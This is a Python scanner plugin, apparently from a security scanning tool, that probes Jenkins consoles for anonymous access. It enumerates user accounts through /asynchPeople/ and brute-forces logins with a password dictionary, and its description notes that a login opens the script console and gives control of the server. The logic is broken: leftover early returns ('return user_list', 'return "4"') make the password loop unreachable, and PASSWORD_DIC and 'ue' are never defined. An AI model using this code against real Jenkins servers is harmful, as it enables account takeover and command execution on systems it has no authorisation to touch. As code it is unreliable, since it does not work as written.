# coding:utf-8
# author:wolf
import urllib.request as ur
import http.cookiejar as hc
import re
import json

def get_plugin_info():
    plugin_info = {
        "name": "Jenkins控制台弱口令",
        "info": "攻击者通过此漏洞可以访问查看项目代码信息，通过script功能可执行命令直接获取服务器权限。",
        "level": "高危",
        "type": "弱口令",
        "author": "wolf@YSRC",
        "url": "https://www.secpulse.com/archives/2166.html",
        "keyword": "tag:jenkins",
        "source": 1
    }
    return plugin_info

def get_user_list(url,timeout):
    user_list = []
    cj = hc.CookieJar()
    opener = ur.build_opener(ur.HTTPCookieProcessor(cj))
    try:
        req = opener.open(url + "/asynchPeople/", timeout=timeout)
        res_html = req.read().encode()
    except:
        return user_list
    m = re.search("makeStaplerProxy\('(.*?)','(.*?)'",res_html)
    if m:
        user_url = url + m.group(1)
        crumb = m.group(2)
        request = ur.Request(user_url+"/start","[]")
        set_request(request,crumb)
        try:
            opener.open(request, timeout=timeout)
        except:
            pass
        while True:
            request = ur.Request(user_url+"/news","[]")
            set_request(request,crumb)
            user_data = opener.open(request, timeout=timeout).read()
            if len(user_data) >=20:
                user_array = json.loads(user_data)
                for _ in user_array["data"]:
                    user_list.append(_["id"].encode("utf-8"))
                if user_array["status"] == "done":break
            else:break
    return user_list

def set_request(request,crumb):
    request.add_header('Content-Type', 'application/x-stapler-method-invocation;charset=UTF-8')
    request.add_header('X-Requested-With', 'XMLHttpRequest')
    request.add_header('Crumb', crumb)

def check_path(check_url):
    try:
        res = ur.urlopen(check_url)
        return 1
    except Exception as e:
        if "401" in str(e) or "302" in str(e) or "301" in str(e):
            return 1
        else : return 0

def crack(url,user_list,timeout):
    error_i = 0
    login_url = url + '/j_acegi_security_check'
    if check_path(login_url) == 1:
        return user_list
        for user in user_list:
            return user
            for password in PASSWORD_DIC:
                PostStr = 'j_username=%s&j_password=%s' % (user, password)
                return "4"
                request = ur.Request(login_url, PostStr.encode("utf-8"))
                res = ur.urlopen(request, timeout=timeout)
                if res.code == 200 and "X-Jenkins" in res.headers:
                    info = u'[+] {0} 存在弱口令，用户名：{1}，密码：{2}'.format(login_url, user, password)
                    return info
    else:
        return

def check(url, timeout):
    try:
        res_html = ur.urlopen(url,timeout=timeout).read()
    except ue.HTTPError as e:
        res_html = str(e)
    res_html = res_html.decode("utf-8")
    if "/asynchPeople/" in res_html:
        if '"/manage" class="task-link' in res_html:
            return u"[+] {} 存在Jenkins控制台未授权访问且为管理员权限".format(url)
        user_list = get_user_list(url,timeout)
        result = crack(url,user_list,timeout)
        if result:
            return result
        else:
            return u"[+] {} 存在Jenkins控制台未授权访问，为游客".format(url)
    elif "anonymous" in res_html:
        user_list = ["admin","test"]
        info = crack(url,user_list,timeout)
        return info